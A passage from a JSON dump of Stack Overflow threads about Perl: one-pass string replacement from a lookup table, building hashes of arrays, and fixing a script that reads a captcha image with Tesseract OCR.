"https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533134607, "post_id": 51633230, "comment_id": 90236714, "body": "@haukex: You may have a point about <code>quotemeta</code>, but there is no need to sort the keys by descending length because of the enclosing <code>\\b</code> anchors."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 23, "user_id": 10165154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c15e439ed00559f43c41946d821e053b?s=128&d=identicon&r=PG&f=1", "display_name": "panconchoclo", "link": "https://stackoverflow.com/users/10165154/panconchoclo"}, "edited": false, "score": 0, "creation_date": 1533136623, "post_id": 51633230, "comment_id": 90238091, "body": "@panconchoclo: I have assumed that your data is all alphanumeric, as you have shown in your question. If it could contain Perl <i>regex metacharacters</i> (any of <code>{ } [ ] ( ) ^ $ . | * + ? \\ </code> ) then you need to take special measures, so let me know."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533137421, "post_id": 51633230, "comment_id": 90238614, "body": "@haukex: Note that sorting by descending length is only useful if <i>all</i> of the data tokens can be found in the hash. If some tokens should not be replaced and do not appear in the hash then there may still be keys that are substrings of those tokens and the procedure will break. Boundary anchors are necessary. Yes, I got your meaning. I just overlooked <code>\\W</code> characters at the <i>ends</i> of the string defeating the <code>\\b</code> anchor. It would have to be <code>map { &quot;(?&lt;!\\S)$_(?!\\S)&quot; } keys %repl</code> which I don&#39;t want to post unless I have to!"}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533139453, "post_id": 51633230, "comment_id": 90239864, "body": "Yes, I didn&#39;t mean that the <code>\\b</code> isn&#39;t necessary, and I could have written the code snippet in my first comment as <code>my ($re) = map {qr&#47;\\b(?:$_)\\b&#47;} join ...</code> to be more in line with your code. And of course the circumstances under which the code might break are complex, but in general I&#39;d still recommend sorting on length to have it work under <i>all</i> circumstances - your lookaround suggestion still <a href=\"https://gist.github.com/haukex/c0f06c3d11728a89a6a89f879ea32405\" rel=\"nofollow noreferrer\">breaks</a> if the keys contain whitespace, sorting on length fixes that \ud83d\ude09"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1533134501, "last_edit_date": 1533134501, "creation_date": 1533126200, "answer_id": 51633230, "question_id": 51632695, "link": "https://stackoverflow.com/questions/51632695/how-to-replace-strings-avoiding-making-second-order-replacements/51633230#51633230", "title": "How to replace strings avoiding making second order replacements?", "body": "<p>Here's some Perl code that reads the replacement hash from <code>repl.txt</code>. It looks like</p>\n\n<h3>repl.txt</h3>\n\n<pre><code>X1      X2 X3\nX2      X7\nX3      X8\n</code></pre>\n\n<p>The input is read from the <code>DATA</code> file handle. You can easily modify this by opening a file of your own. The simplest way is to specify the path to the input file as a parameter on the command line; then you can just change <code>&lt;DATA&gt;</code> to <code>&lt;&gt;</code>: no explicitopening is required</p>\n\n<h3>repl.pl</h3>\n\n<pre><code>use strict;\nuse warnings 'all';\n\n# Read the hash from `repl.txt`\nmy %repl = do {\n    open my $fh, '&lt;', 'repl.txt' or die $!;\n    map { chomp; split ' ', $_, 2; } &lt;$fh&gt;;\n};\n\n# Build and compile regex pattern\nmy $re = join '|', map { \"\\\\b$_\\\\b\" } keys %repl;\n$re = qr/$re/;\n\nwhile ( &lt;DATA&gt; ) {\n    s/($re)/$repl{$1}/g;\n    print;\n}\n\n__DATA__\nID1 X1 X2 X3\nID2 X3 X4 X5\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>ID1 X2 X3 X7 X8\nID2 X8 X4 X5\n</code></pre>\n\n<h2>Update</h2>\n\n<p>If you prefer two separate files for the keys and values of the hash, then change the loading of hash like this</p>\n\n<h3>col1</h3>\n\n<pre><code>X1\nX2\nX3\n</code></pre>\n\n<h3>col2</h3>\n\n<pre><code>X2 X3\nX7\nX8\n</code></pre>\n\n<h3>Code to load hash <code>%repl</code></h3>\n\n<pre><code>my %repl;\n{\n    my $fh;\n\n    open $fh, '&lt;', 'col1' or die $!;\n    my @keys = map { chomp; $_; } &lt;$fh&gt;;\n\n    open $fh, '&lt;', 'col2' or die $!;\n    my @vals = map { chomp; $_; } &lt;$fh&gt;;\n\n    @repl{@keys} = @vals;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "is_accepted": false, "score": 0, "last_activity_date": 1533133897, "last_edit_date": 1533133897, "creation_date": 1533132813, "answer_id": 51635550, "question_id": 51632695, "link": "https://stackoverflow.com/questions/51632695/how-to-replace-strings-avoiding-making-second-order-replacements/51635550#51635550", "title": "How to replace strings avoiding making second order replacements?", "body": "<p>sed is only for simple substitutions on individual lines and you shouldn't use a shell loop to manipulate text (see <a href=\"https://unix.stackexchange.com/questions/169716/why-is-using-a-shell-loop-to-process-text-considered-bad-practice\">why-is-using-a-shell-loop-to-process-text-considered-bad-practice</a>). For anything else you should use awk for simplicity, clarity, robustness, efficiency, portability, etc.:</p>\n\n<pre><code>$ awk '\n    NR==FNR { map[$1]=$2; next }\n    { for (i=1;i&lt;=NF;i++) $i=($i in map ? map[$i] : $i); print }\n' FS='\\t' repl.txt FS=' ' file\nID1 X2 X3 X7 X8\nID2 X8 X4 X5\n</code></pre>\n\n<p>The above will work robustly and efficiently using any awk in any shell on any UNIX system. Note that it's using literal strings and so will not fail if/when your old or new strings contain regexp or backreference metacharacters or any other characters, unlike the sed script in your question.</p>\n\n<p>The input files used above are the following, with the old vs new values in repl.txt tab-separated:</p>\n\n<pre><code>$ cat repl.txt\nX1      X2 X3\nX2      X7\nX3      X8\n\n$ cat file\nID1 X1 X2 X3\nID2 X3 X4 X5\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 46858, "user_id": 967492, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/526ea226101e199d029049dda22a4e58?s=128&d=identicon&r=PG", "display_name": "potong", "link": "https://stackoverflow.com/users/967492/potong"}, "is_accepted": false, "score": 0, "last_activity_date": 1533133554, "creation_date": 1533133554, "answer_id": 51635831, "question_id": 51632695, "link": "https://stackoverflow.com/questions/51632695/how-to-replace-strings-avoiding-making-second-order-replacements/51635831#51635831", "title": "How to replace strings avoiding making second order replacements?", "body": "<p>This might work for you (GNU sed):</p>\n\n<pre><code>sed -r '1d;s#(\\S+)\\s*(.*)#s/\\\\n\\1\\\\n/\\2/#' replacementFile |\nsed -re 's/\\S+/\\n&amp;\\n/g' -f - -e 's/\\n//g' inputFile\n</code></pre>\n\n<p>Use the <code>replacementFile</code> to create a sed script and combine this with some boilerplate sed code.</p>\n\n<p>The first set of sed commands creates sed substitution commands with the LHS being the values to substituted and RHS the replacement. The LHS is surrounded by newlines.</p>\n\n<p>The second set of sed commands, first surrounds all values by newlines, then uses the script from the first set of sed commands and lastly removes the newlines.</p>\n\n<p>Since all values are expected to surrounded by newlines and those that are replaced are not, there can be no confusion about substituting the wrong values.</p>\n"}], "owner": {"reputation": 23, "user_id": 10165154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c15e439ed00559f43c41946d821e053b?s=128&d=identicon&r=PG&f=1", "display_name": "panconchoclo", "link": "https://stackoverflow.com/users/10165154/panconchoclo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 1, "accepted_answer_id": 51633230, "answer_count": 4, "score": 2, "last_activity_date": 1533143185, "creation_date": 1533124625, "last_edit_date": 1533143185, "question_id": 51632695, "link": "https://stackoverflow.com/questions/51632695/how-to-replace-strings-avoiding-making-second-order-replacements", "title": "How to replace strings avoiding making second order replacements?", "body": "\n\n<p>I have a text file and I want to make a text replacement. However, my problem this time is that the new text also includes text that originally exists in the original file and that appears in the hash of replacements.</p>\n\n<p>How can I replace text but only once per line, avoiding making \"second order\" replacements?</p>\n\n<p>Normally I do replacements with sed where I use col1 and col2 file for the replacement. col1 has the original string to replace; col2 the new one. </p>\n\n<h3>input file:</h3>\n\n<pre><code>ID1 X1 X2 X3\nID2 X3 X4 X5\n</code></pre>\n\n\n\n<pre><code>col1    col2 of \"hash\" used for replacement:\nX1      X2 X3\nX2      X7\nX3      X8\n</code></pre>\n\n<h3>output after replacement with sed</h3>\n\n<pre><code>ID1 X7 X3 X7 X8\nID2 X3 X4 X5\n</code></pre>\n\n<h3>Expected output</h3>\n\n<pre><code>ID1 X2 X3 X7 X8\nID2 X8 X4 X5\n</code></pre>\n\n<h3>bash command used</h3>\n\n<pre><code>paste col1 col2 | while read n k; do sed -i \\\"\\\" \\\"s/$n/$k/g\\\" input; done\n</code></pre>\n"}, {"tags": ["perl", "perl-hash"], "answers": [{"comments": [{"owner": {"reputation": 320, "user_id": 7153813, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vgq2A.jpg?s=128&g=1", "display_name": "libxelar.so", "link": "https://stackoverflow.com/users/7153813/libxelar-so"}, "edited": false, "score": 0, "creation_date": 1533128033, "post_id": 51631662, "comment_id": 90231804, "body": "Very very clean, and nice. Thanks for help.(  For whatever reason equal sign near split is not visible.  )"}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 3, "last_activity_date": 1533124310, "last_edit_date": 1533124310, "creation_date": 1533121378, "answer_id": 51631662, "question_id": 51631370, "link": "https://stackoverflow.com/questions/51631370/inserting-and-iterating-over-hash-of-arrays/51631662#51631662", "title": "Inserting and iterating over hash of arrays", "body": "<p>You're over-complicating massively, I'm afraid.</p>\n\n<pre><code>open my $fh, '&lt;', $info_file or die \"Can't open '$info_file': $!\";\n\nmy %info;\n\nwhile (&lt;$fh&gt;) {\n  next unless /^[A-Z]/;\n  chomp;\n  my ($name, $operator) = split /:/;\n  push @{ $info{$name} }, $operator;\n}\n</code></pre>\n\n<p>And to access it:</p>\n\n<pre><code>foreach my $i (keys %info) {\n  foreach my $op (@{ $info{$i} }) {\n    say \"$i ----&gt; $op\";\n  }\n}\n</code></pre>\n\n<p>If you treat a hash value as though it's an array reference, then Perl will make it an array reference.</p>\n\n<p>See the <a href=\"https://perldoc.pl/perldsc\" rel=\"nofollow noreferrer\">Perl Data Structures Cookbook</a> for more details.</p>\n"}, {"tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": false, "score": 2, "last_activity_date": 1533122471, "creation_date": 1533122471, "answer_id": 51632007, "question_id": 51631370, "link": "https://stackoverflow.com/questions/51631370/inserting-and-iterating-over-hash-of-arrays/51632007#51632007", "title": "Inserting and iterating over hash of arrays", "body": "<p>OK there is a lot wrong with this code firstly, use the three input form of open and don't quote variables by default, Perl knows when things should be strings. So <code>open($fh,\"$info_file\");</code> should be <code>open($fh, '&lt;', $info_file);</code></p>\n\n<p>Second split does not return the separator character by default so <code>$operator = $tokens[2];</code> should be <code>$operator = $tokens[1];</code></p>\n\n<p>Third why are you ignoring countries that don't start with A to Z in your file?</p>\n\n<p>Fourth use auto vivification so the whole of the <code>if else</code> block can be replaced by <code>push @{$INFO{$name}}, $operator</code></p>\n\n<p>Fifth <code>$ptr</code> and <code>@ptr</code> are separate variables assigning an array ref to <code>$ptr</code> does not make it available in <code>@ptr</code> also <code>\\$INFO{$name}</code> is taking a reference to what ever <code>$INFO{$name}</code> is, which in your case is already an array ref so you are getting a reference to an array ref in <code>$ptr</code> this should have been written <code>$ptr = $INFO{$name};</code> if you where keeping this code.</p>\n\n<p>Sixth assigning to @array is redundant the two lines in the else clause should have been written <code>$INFO{$name} = [ $operator ];</code></p>\n\n<p>With all these changes you get</p>\n\n<pre><code>open($fh, '&lt;', \"$info_file\");\nwhile (my $row = &lt;$fh&gt;) {\n    chomp $row;\n    my @tokens = split(\":\",$row);\n    $name = $tokens[0];\n    $operator = $tokens[1];\n    if ($name =~ /^[A-Z]/) {\n        push @{$INFO{$name}}, $operator;\n    }\n}\nclose($f);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1533123897, "last_edit_date": 1533123897, "creation_date": 1533123410, "answer_id": 51632282, "question_id": 51631370, "link": "https://stackoverflow.com/questions/51631370/inserting-and-iterating-over-hash-of-arrays/51632282#51632282", "title": "Inserting and iterating over hash of arrays", "body": "<p>You're very close, but there's no need for the explicit use of references or to initialise a hash value to an empty array</p>\n\n<p>This is all you need</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nopen my $fh, '&lt;', $info_file or die $!;\n\nmy %info;\n\nwhile ( &lt;$fh&gt; ) {\n    chomp;\n    my ($name, $operator) = split /:/;\n    push @{ $info{$name} }, $operator if $name =~ /^[A-Z]/;\n}\n</code></pre>\n"}], "owner": {"reputation": 320, "user_id": 7153813, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vgq2A.jpg?s=128&g=1", "display_name": "libxelar.so", "link": "https://stackoverflow.com/users/7153813/libxelar-so"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 0, "accepted_answer_id": 51631662, "answer_count": 3, "score": 1, "last_activity_date": 1533124310, "creation_date": 1533120419, "last_edit_date": 1533124005, "question_id": 51631370, "link": "https://stackoverflow.com/questions/51631370/inserting-and-iterating-over-hash-of-arrays", "title": "Inserting and iterating over hash of arrays", "body": "\n\n<p>I have following input data</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Country1:operator1\nCountry1:operator2\nCountry1:operator3\n\nCountry2:operator1\nCountry2:operator2\nCountry2:operator3\n</code></pre>\n\n<p>I would like to insert this data into hash <code>%INFO</code> such that every key corresponds to an array of \"operators\", so I could iterate in following way</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>foreach $i ( keys %INFO ) {\n\n    foreach $operator ( $INFO{$i} ) {\n        print \" $i ---&gt; $operator \\n\";  \n    }\n}\n</code></pre>\n\n<p>Here is my own solution that doesn't work properly</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>open($fh, \"$info_file\");\n\nwhile (my $row = &lt;$fh&gt;) {\n    chomp $row;\n    @tokens = split(\":\",$row);\n\n    $name     = $tokens[0];\n    $operator = $tokens[2];\n\n    if ($name =~ /^[A-Z]/) {\n\n        if ( exists $INFO{$name} ) {\n            $ptr = \\$INFO{$name};\n            push(@ptr, $operator);\n        }\n        else {\n            @array = ( \"$operator\" );\n            $INFO{$name} = [ @array ];\n        }\n    }\n}\n\nclose($f);\n</code></pre>\n"}, {"tags": ["perl", "ocr", "tesseract", "captcha"], "comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1533114310, "post_id": 51628713, "comment_id": 90222867, "body": "Are you sure it didn&#39;t? What does the file &quot;ocr_result&quot; contain?"}, {"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "edited": false, "score": 0, "creation_date": 1533115027, "post_id": 51628713, "comment_id": 90223310, "body": "Looks like you haven&#39;t defined $txt anywhere so you have an empty ocr_result.txt"}, {"owner": {"reputation": 8974, "user_id": 205207, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/1OH7W.jpg?s=128&g=1", "display_name": "i alarmed alien", "link": "https://stackoverflow.com/users/205207/i-alarmed-alien"}, "edited": false, "score": 0, "creation_date": 1533117848, "post_id": 51628713, "comment_id": 90225223, "body": "Add <code>use strict; use warnings;</code> to the top of all your scripts, and initialise variables with <code>my</code> (e.g. <code>my $variable</code>) to help eliminate simple errors."}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1533132136, "post_id": 51628713, "comment_id": 90234894, "body": "@Chris Turner, &quot;ocr_result&quot; need to contain the text from captcha. But in my previous code as I can see, I get nothing text from Tesseract to this file"}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "edited": false, "score": 0, "creation_date": 1533132721, "post_id": 51628713, "comment_id": 90235306, "body": "@i alarmed alien, thanks for your suggestion. Added strict and warnings in my code"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1533133080, "post_id": 51628713, "comment_id": 90235582, "body": "My point was more that tesseract was writing out to &quot;ocr_result&quot;, but you were looking for the result in &quot;ocr_result.txt&quot; which is a different file."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1533133683, "post_id": 51628713, "comment_id": 90236046, "body": "@ChrisTurner: I thought that too. But reading the man page for tesseract, it says that parameter is the &quot;basename of the output file&quot; and it gets .txt appended to it."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533134080, "post_id": 51628713, "comment_id": 90236339, "body": "@Oysiyl: You need to give <code>tesseract</code> the special string <code>stdout</code> (not the filename) for my code to work. Attention to detail is a vital part of the programmer&#39;s work :-)"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533134267, "post_id": 51628713, "comment_id": 90236466, "body": "@Oysiyl: I see you&#39;ve updated the code following my last suggestion. Is the output now out of date?"}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533134398, "post_id": 51628713, "comment_id": 90236578, "body": "@Dave Cross, still the same( Captcha text not specified. Maybe I am add my real user and pass information to code? Can this help?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533134593, "post_id": 51628713, "comment_id": 90236706, "body": "@Oysiyl: You need to take this a step at a time. There&#39;s no point in trying to <code>POST</code> the data until you know the correct string is in <code>$txt</code>. So we need to work out why <code>tesseract</code> doesn&#39;t do the OCR for you when it works perfectly for me. Have you checked the contents of <code>ocr_me.img</code>? Does it contain the image data that you expect?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1533134619, "post_id": 51628713, "comment_id": 90236726, "body": "@Oysiyl: Think like a programmer."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533134734, "post_id": 51628713, "comment_id": 90236804, "body": "@Oysiyl: I wouldn&#39;t recommend posting your username and password here. But if you want to email them to me, I can have a closer look at your code. My domain is <code>perlhacks.com</code> and my email address is my first name."}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533136777, "post_id": 51628713, "comment_id": 90238206, "body": "@DaveCross, send you message via email"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533138101, "post_id": 51628713, "comment_id": 90239084, "body": "@Oysiyl: Updated my answer below."}], "answers": [{"comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "edited": false, "score": 2, "creation_date": 1533133878, "post_id": 51630558, "comment_id": 90236187, "body": "@Oysiyl you haven&#39;t updated it correctly though - note the difference in how Dave is running tesseract and how you&#39;re now running it."}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1533134100, "post_id": 51630558, "comment_id": 90236351, "body": "@Chris Turner, I see I am forget stdout. Change code now"}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "edited": false, "score": 0, "creation_date": 1533142093, "post_id": 51630558, "comment_id": 90241367, "body": "@DaveCross, Thank you for your help! I&#39;ll try to be more accurate. Sorry to take so much of your time. Now I see that I incorrectly chose the address and the benefit of my question on this site is not as big as I thought. To execute my request, I need to raise the server with Putty on SSH protocol. Maybe that&#39;s why my script does not see the picture.."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 2, "last_activity_date": 1533138034, "last_edit_date": 1533138034, "creation_date": 1533117884, "answer_id": 51630558, "question_id": 51628713, "link": "https://stackoverflow.com/questions/51628713/tesseract-dont-recognize-captcha-in-png-file-which-contains-numbers-and-letters/51630558#51630558", "title": "Tesseract dont recognize captcha in png file, which contains numbers and letters of the English alphabet", "body": "<p>Several strange things going on here. Any one of them could be causing your problems.</p>\n\n<ol>\n<li>Having <code>-X</code> on your shebang line is a terrible idea. It explicitly turns off warnings. I suggest you remove it, add <code>use warnings</code> to your code and fix all the problems that reveals (I'd suggest adding <code>use strict</code> too, but you'd need to declare all of your variables).</li>\n<li>I'd recommend using <a href=\"https://metacpan.org/pod/LWP::Simple\" rel=\"nofollow noreferrer\">LWP::Simple</a> instead of shelling out to <code>GET</code>.</li>\n<li>Please don't use regexes to parse HTML. Use a real HTML parser instead. <a href=\"https://metacpan.org/release/Web-Query\" rel=\"nofollow noreferrer\">Web::Query</a> is my current favourite.</li>\n<li>You then run <code>GET</code> again, using a variable called <code>$txt</code> that doesn't have a value. That's not going to work!</li>\n<li><code>$txt = 'cat ocr_result.txt'</code> doesn't do what you think it does. You want backticks, not single quotes.</li>\n</ol>\n\n<p><strong>Update:</strong> Obviously, I don't have access to your username or password, so I can't reconstruct all of your code. But this seems to work fine for accessing the image in your example and extracting the text from it.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\n\nuse LWP::Simple;\n\nmy $img_url  = 'http://perltest.adavice.com/captcha/1533110309.png';\nmy $img_file = 'ocr_me.img';\n\ngetstore($img_url, $img_file);\n\nmy $txt = `tesseract $img_file stdout`;\n\nsay $txt;\n</code></pre>\n\n<p>Here's your actual error:</p>\n\n<pre><code>system(\"tesseract ocr_me.img ocr_result\");\nprint \"GET '$txt' &gt; ocr_result.txt\\n\";\nsystem \"GET '$txt' &gt; ocr_result.txt\";\n</code></pre>\n\n<p>You ask <code>tesseract</code> to write its output to <code>ocr_result.txt</code>, but two lines later, you overwrite that file with the output of a failed call to <code>GET</code>. I'm not sure what you think 